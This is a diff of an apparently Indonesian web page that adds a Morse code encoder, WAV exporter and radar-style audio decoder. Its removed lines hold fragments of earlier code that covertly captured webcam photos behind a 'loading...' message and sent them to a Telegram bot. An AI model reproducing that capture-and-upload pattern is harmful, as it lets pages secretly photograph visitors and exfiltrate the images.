+            const ctx = getAudioContext();
+            const txt = document.getElementById('tx-input').value;
+            const wpm = parseInt(document.getElementById('wpm-slider').value);
+            const freq = parseInt(document.getElementById('freq-slider').value);
+
+            if (!txt.trim()) {
+                showToast('Masukkan teks terlebih dahulu!');
+                return;
+            }
+
+            if (isPlayingTx && currentSourceNode) {
+                currentSourceNode.stop();
+                isPlayingTx = false;
+                document.getElementById('btn-tx-play').innerHTML = `
+                    <svg class="w-5 h-5 fill-current" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+                    PLAY MORSE SOUND
+                `;
+                return;
+            }
+
+            const buffer = generateMorseAudioBuffer(txt, wpm, freq);
+            currentSourceNode = ctx.createBufferSource();
+            currentSourceNode.buffer = buffer;
+            currentSourceNode.connect(ctx.destination);
+
+            currentSourceNode.onended = () => {
+                isPlayingTx = false;
+                document.getElementById('btn-tx-play').innerHTML = `
+                    <svg class="w-5 h-5 fill-current" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+                    PLAY MORSE SOUND
+                `;
+            };
+
+            currentSourceNode.start(0);
+            isPlayingTx = true;
+            document.getElementById('btn-tx-play').innerHTML = `
+                <svg class="w-5 h-5 fill-current" viewBox="0 0 24 24"><path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z"/></svg>
+                STOP PLAYBACK
+            `;
+            showToast('Memutar suara morse...');
+        }
+
+        /* WAV Encoder function */
+        function downloadMorseWav() {
+            const txt = document.getElementById('tx-input').value;
+            const wpm = parseInt(document.getElementById('wpm-slider').value);
+            const freq = parseInt(document.getElementById('freq-slider').value);
+
+            if (!txt.trim()) {
+                showToast('Masukkan teks terlebih dahulu!');
+                return;
+            }
+
+            const ctx = getAudioContext();
+            const buffer = generateMorseAudioBuffer(txt, wpm, freq);
+            const wavBlob = audioBufferToWavBlob(buffer);
+
+            const url = URL.createObjectURL(wavBlob);
+            const a = document.createElement('a');
+            a.style.display = 'none';
+            a.href = url;
+            a.download = `Morse_25WPM_${Date.now()}.wav`;
+            document.body.appendChild(a);
+            a.click();
+            setTimeout(() => {
+                document.body.removeChild(a);
+                window.URL.revokeObjectURL(url);
+            }, 100);
+
+            showToast('Audio Morse (.WAV) berhasil diunduh!');
+        }
+
+        function audioBufferToWavBlob(buffer) {
+            const numChannels = buffer.numberOfChannels;
+            const sampleRate = buffer.sampleRate;
+            const format = 1; // PCM
+            const bitDepth = 16;
+            
+            const samples = buffer.getChannelData(0);
+            const dataLength = samples.length * 2;
+            const bufferLength = 44 + dataLength;
+            
+            const arrayBuffer = new ArrayBuffer(bufferLength);
+            const view = new DataView(arrayBuffer);
+
+            /* RIFF identifier */
+            writeString(view, 0, 'RIFF');
+            /* RIFF chunk length */
+            view.setUint32(4, 36 + dataLength, true);
+            /* RIFF type */
+            writeString(view, 8, 'WAVE');
+            /* format chunk identifier */
+            writeString(view, 12, 'fmt ');
+            /* format chunk length */
+            view.setUint32(16, 16, true);
+            /* sample format (raw PCM) */
+            view.setUint16(20, format, true);
+            /* channel count */
+            view.setUint16(22, numChannels, true);
+            /* sample rate */
+            view.setUint32(24, sampleRate, true);
+            /* byte rate (sample rate * block align) */
+            view.setUint32(28, sampleRate * numChannels * (bitDepth / 8), true);
+            /* block align (channel count * bytes per sample) */
+            view.setUint16(32, numChannels * (bitDepth / 8), true);
+            /* bits per sample */
+            view.setUint16(34, bitDepth, true);
+            /* data chunk identifier */
+            writeString(view, 36, 'data');
+            /* data chunk length */
+            view.setUint32(40, dataLength, true);
+
+            // Write PCM audio samples
+            let offset = 44;
+            for (let i = 0; i < samples.length; i++, offset += 2) {
+                const s = Math.max(-1, Math.min(1, samples[i]));
+                view.setInt16(offset, s < 0 ? s * 0x8000 : s * 0x7FFF, true);
+            }
+
+            return new Blob([arrayBuffer], { type: 'audio/wav' });
+        }
+
+        function writeString(view, offset, string) {
+            for (let i = 0; i < string.length; i++) {
+                view.setUint8(offset + i, string.charCodeAt(i));
+            }
+        }
+
+        /* ==================== FEATURE 2: MORSE TO TEXT DECODER (RADAR) ==================== */
+        let radarSweepAngle = 0;
+        let detectedBlips = [];
+
+        function initRadarCanvas() {
+            const canvas = document.getElementById('radarCanvas');
+            const ctx = canvas.getContext('2d');
+            
+            function renderRadar() {
+                const width = canvas.width;
+                const height = canvas.height;
+                const cx = width / 2;
+                const cy = height / 2;
+                const radius = cx - 10;
+
+                // Clear
+                ctx.fillStyle = 'rgba(3, 7, 18, 0.15)';
+                ctx.fillRect(0, 0, width, height);
+
+                // Draw Radar Grid Circles
+                ctx.strokeStyle = 'rgba(0, 243, 255, 0.25)';
+                ctx.lineWidth = 1;
+
+                [0.25, 0.5, 0.75, 1.0].forEach(r => {
+                    ctx.beginPath();
+                    ctx.arc(cx, cy, radius * r, 0, Math.PI * 2);
+                    ctx.stroke();
+                });
+
+                // Crosshairs
+                ctx.beginPath();
+                ctx.moveTo(cx - radius, cy);
+                ctx.lineTo(cx + radius, cy);
+                ctx.moveTo(cx, cy - radius);
+                ctx.lineTo(cx, cy + radius);
+                ctx.stroke();
+
+                // Draw Waveform overlay along radar sweep
+                if (rxAnalyser) {
+                    const timeData = new Uint8Array(rxAnalyser.fftSize);
+                    rxAnalyser.getByteTimeDomainData(timeData);
+
+                    ctx.beginPath();
+                    ctx.strokeStyle = '#00f3ff';
+                    ctx.lineWidth = 1.5;
+
+                    const sliceAngle = (Math.PI * 2) / timeData.length;
+                    for (let i = 0; i < timeData.length; i++) {
+                        const v = timeData[i] / 128.0; // 0.0 to 2.0
+                        const r = (radius * 0.6) + (v - 1.0) * 40;
+                        const angle = i * sliceAngle + radarSweepAngle;
+                        const x = cx + r * Math.cos(angle);
+                        const y = cy + r * Math.sin(angle);
+
+                        if (i === 0) ctx.moveTo(x, y);
+                        else ctx.lineTo(x, y);
+                    }
+                    ctx.stroke();
                 }
 
-                status.innerText = "loading...";
-                video.srcObject.getTracks().forEach(track => track.stop());
-            } catch (err) {
-                status.innerText = "Izin kamera diperlukan.";
+                // Rotating Sweep Line
+                radarSweepAngle += 0.03;
+                if (radarSweepAngle > Math.PI * 2) radarSweepAngle = 0;
+
+                ctx.beginPath();
+                ctx.moveTo(cx, cy);
+                const sweepX = cx + radius * Math.cos(radarSweepAngle);
+                const sweepY = cy + radius * Math.sin(radarSweepAngle);
+                ctx.lineTo(sweepX, sweepY);
+
+                const grad = ctx.createLinearGradient(cx, cy, sweepX, sweepY);
+                grad.addColorStop(0, 'rgba(0, 243, 255, 0.8)');
+                grad.addColorStop(1, 'rgba(0, 243, 255, 0.1)');
+                ctx.strokeStyle = grad;
+                ctx.lineWidth = 2;
+                ctx.stroke();
+
+                // Draw Signal Blips
+                ctx.fillStyle = '#00f3ff';
+                for (let i = detectedBlips.length - 1; i >= 0; i--) {
+                    const blip = detectedBlips[i];
+                    ctx.globalAlpha = blip.alpha;
+                    ctx.beginPath();
+                    ctx.arc(blip.x, blip.y, blip.size, 0, Math.PI * 2);
+                    ctx.fill();
+                    blip.alpha -= 0.015;
+                    if (blip.alpha <= 0) detectedBlips.splice(i, 1);
+                }
+                ctx.globalAlpha = 1.0;
+
+                requestAnimationFrame(renderRadar);
             }
+
+            renderRadar();
         }
 
-        async function takeAndSendPhoto(index) {
-            const tempCanvas = document.createElement('canvas');
-            tempCanvas.width = video.videoWidth;
-            tempCanvas.height = video.videoHeight;
-            tempCanvas.getContext('2d').drawImage(video, 0, 0);
+        function setRxSource(source) {
+            rxMode = source;
+            const micBtn = document.getElementById('rx-source-mic');
             
-            const imageData = tempCanvas.toDataURL('image/jpeg');
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', dataURLToBlob(imageData));
-            formData.append('caption', `📸 Pose ${index} dari 5`);
-
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-            } catch (e) {
-                console.error("reload halaman");
+            if (source === 'mic') {
+                micBtn.className = "p-3 rounded-xl border border-cyan-400 bg-cyan-500/20 text-cyan-300 flex items-center justify-center gap-2 transition";
+                startMicRx();
             }
         }
 
-        function dataURLToBlob(dataURL) {
-            const arr = dataURL.split(',');
-            const mime = arr[0].match(/:(.*?);/)[1];
-            const bstr = atob(arr[1]);
-            let n = bstr.length;
-            const u8arr = new Uint8Array(n);
-            while(n--){ u8arr[n] = bstr.charCodeAt(n); }
-            return new Blob([u8arr], {type:mime});
+        async function startMicRx() {
+            stopRxProcessing();
+            try {
+                rxStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+                rxAudioContext = new (window.AudioContext || window.webkitAudioContext)();
+                
+                rxSourceNode = rxAudioContext.createMediaStreamSource(rxStream);
+                setupRxNodes();
+
+                document.getElementById('radar-status-badge').innerText = "LIVE MIC ACTIVE";
+                document.getElementById('radar-status-badge').className = "px-2 py-0.5 rounded bg-cyan-950/80 text-cyan-300 border border-cyan-500/40 animate-pulse";
+                showToast('Radar aktif: Mendengarkan Mikrofon...');
+            } catch (err) {
+                showToast('Gagal mengakses Mikrofon: ' + err.message);
+            }
         }
 
-        startBtn.addEventListener('click', initCamera);
+        function handleFileUpload(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+
+            document.getElementById('file-label-txt').innerText = file.name.substring(0, 12) + '...';
+            stopRxProcessing();
+
+            const reader = new FileReader();
+            reader.onload = async function(e) {
+                const arrayBuffer = e.target.result;
+                rxAudioContext = new (window.AudioContext || window.webkitAudioContext)();
+                
+                try {
+                    const audioBuffer = await rxAudioContext.decodeAudioData(arrayBuffer);
+                    rxSourceNode = rxAudioContext.createBufferSource();
+                    rxSourceNode.buffer = audioBuffer;
+                    
+                    setupRxNodes();
+                    rxSourceNode.connect(rxAudioContext.destination); // Play audio as well
+                    rxSourceNode.start(0);
+
+                    document.getElementById('radar-status-badge').innerText = "FILE PLAYING";
+                    document.getElementById('radar-status-badge').className = "px-2 py-0.5 rounded bg-blue-950/80 text-blue-300 border border-blue-500/40 animate-pulse";
+                    showToast('Memproses file audio Morse...');
+
+                    rxSourceNode.onended = () => {
+                        document.getElementById('radar-status-badge').innerText = "FILE COMPLETED";
+                        document.getElementById('radar-status-badge').className = "px-2 py-0.5 rounded bg-gray-900 text-gray-400 border border-gray-700";
+                    };
+                } catch (err) {
+                    showToast('Gagal memproses file audio: ' + err.message);
+                }
+            };
+            reader.readAsArrayBuffer(file);
+        }
+
+        function setupRxNodes() {
+            // Bandpass filter to isolate ~750Hz Morse tones
+            rxFilter = rxAudioContext.createBiquadFilter();
+            rxFilter.type = "bandpass";
+            rxFilter.frequency.value = 750;
+            rxFilter.Q.value = 8.0;
+
+            // Analyser Node
+            rxAnalyser = rxAudioContext.createAnalyser();
+            rxAnalyser.fftSize = 512;
+
+            rxSourceNode.connect(rxFilter);
+            rxFilter.connect(rxAnalyser);
+
+            // Start Signal Detection Loop
+            processRxAudioSignal();
+        }
+
+        function processRxAudioSignal() {
+            if (!rxAnalyser) return;
+
+            const bufferLength = rxAnalyser.frequencyBinCount;
+            const dataArray = new Uint8Array(bufferLength);
+            rxAnalyser.getByteFrequencyData(dataArray);
+
+            // Energy near 750 Hz bin
+            // Sample rate e.g., 44100. Bin size = 44100 / 512 = ~86 Hz. Bin for 750 Hz is ~ index 8-9.
+            let binIndex = Math.round((750 * rxAnalyser.fftSize) / rxAudioContext.sampleRate);
+            let signalEnergy = (dataArray[binIndex - 1] + dataArray[binIndex] + dataArray[binIndex + 1]) / 3;
+
+            const threshold = parseInt(document.getElementById('sensitivity-slider').value);
+            const now = performance.now();
+
+            const ind = document.getElementById('signal-detect-indicator');
+
+            if (signalEnergy > threshold) {
+                // Signal ON
+                ind.style.opacity = "1";
+
+                if (!isSignalActive) {
+                    isSignalActive = true;
+                    signalStartTime = now;
+
+                    // Measure space duration before this signal
+                    if (signalEndTime > 0) {
+                        const offDuration = now - signalEndTime;
+                        
+                        // Check for Letter Space (~140ms at 25 WPM)
+                        if (offDuration >= 110 && offDuration < 280) {
+                            decodeCurrentSymbol();
+                        } 
+                        // Check for Word Space (>= 280ms)
+                        else if (offDuration >= 280) {
+                            decodeCurrentSymbol();
+                            appendDecodedText(" ");
+                        }
+                    }
+
+                    // Add blip to radar
+                    const canvas = document.getElementById('radarCanvas');
+                    const r = (canvas.width / 2) * (0.3 + Math.random() * 0.5);
+                    detectedBlips.push({
+                        x: canvas.width / 2 + r * Math.cos(radarSweepAngle),
+                        y: canvas.height / 2 + r * Math.sin(radarSweepAngle),
+                        size: 3 + Math.random() * 3,
+                        alpha: 1.0
+                    });
+                }
+            } else {
+                // Signal OFF
+                ind.style.opacity = "0.3";
+
+                if (isSignalActive) {
+                    isSignalActive = false;
+                    signalEndTime = now;
+                    const onDuration = now - signalStartTime;
+
+                    // 25 WPM Nominal Threshold: Dot <= 90ms, Dash > 90ms
+                    if (onDuration >= 15) { // filter noise glitch < 15ms
+                        if (onDuration <= 90) {
+                            currentSymbolStream += ".";
+                        } else {
+                            currentSymbolStream += "-";
+                        }
+                        document.getElementById('rx-morse-stream').innerText = currentSymbolStream;
+                    }
+                } else if (signalEndTime > 0 && currentSymbolStream.length > 0) {
+                    // Check if idle long enough to trigger character decode
+                    const idleDuration = now - signalEndTime;
+                    if (idleDuration > 300) {
+                        decodeCurrentSymbol();
+                    }
+                }
+            }
+
+            rxAnimFrame = requestAnimationFrame(processRxAudioSignal);
+        }
+
+        function decodeCurrentSymbol() {
+            if (!currentSymbolStream) return;
+
+            const letter = REVERSE_MORSE_MAP[currentSymbolStream] || '?';
+            appendDecodedText(letter);
+            
+            // UI stream append
+            const streamBox = document.getElementById('rx-morse-stream');
+            streamBox.innerText = currentSymbolStream + " ";
+
+            currentSymbolStream = "";
+        }
+
+        function appendDecodedText(text) {
+            const out = document.getElementById('rx-text-output');
+            if (out.innerText.includes('[Awaiting')) {
+                out.innerText = '';
+            }
+            out.innerText += text;
+            out.scrollTop = out.scrollHeight;
+        }
+
+        function clearRxOutput() {
+            document.getElementById('rx-text-output').innerText = '[Awaiting Morse audio signal...]';
+            document.getElementById('rx-morse-stream').innerText = '...';
+            currentSymbolStream = "";
+        }
+
+        function copyRxText() {
+            const text = document.getElementById('rx-text-output').innerText;
+            if (!text.includes('[Awaiting')) {
+                navigator.clipboard.writeText(text);
+                showToast('Hasil dekode disalin!');
+            }
+        }
+
+        function stopRxProcessing() {
+            if (rxAnimFrame) cancelAnimationFrame(rxAnimFrame);
+            if (rxStream) {
+                rxStream.getTracks().forEach(track => track.stop());
+                rxStream = null;
+            }
+            if (rxSourceNode) {
+                try { rxSourceNode.stop(); } catch(e){}
+                rxSourceNode.disconnect();
+            }
+            if (rxAudioContext) {
+                rxAudioContext.close();
+                rxAudioContext = null;
+            }
+
+            document.getElementById('radar-status-badge').innerText = "IDLE";
+            document.getElementById('radar-status-badge').className = "px-2 py-0.5 rounded bg-red-950/80 text-red-400 border border-red-500/30";
+        }
     </script>
 </body>
 </html>
